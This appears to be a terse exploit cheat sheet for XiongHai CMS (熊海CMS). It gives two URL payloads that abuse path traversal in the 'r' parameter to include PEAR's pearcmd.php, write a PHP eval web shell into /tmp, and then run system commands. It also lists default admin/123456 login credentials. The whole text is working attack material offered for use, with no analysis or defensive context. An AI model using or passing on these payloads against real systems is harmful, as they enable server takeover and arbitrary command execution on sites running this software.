# 熊海CMS pearcmd

```bash
# payload1
http://url/?+config-create+/&r=../../../../../../../../../usr/share/pear/pearcmd&<?=eval($_REQUEST[1]);?>+/tmp/aaa123.php
http://url/?r=../../../../../../../../../tmp/aaa123&1=system('ls');
# payload2
admin/123456 登录
/+config-create+/&r=../../../../../../../../../../usr/share/php/pearcmd&/<?=eval($_POST[cmd]);?>+../../../../../../../../tmp/1.php
```
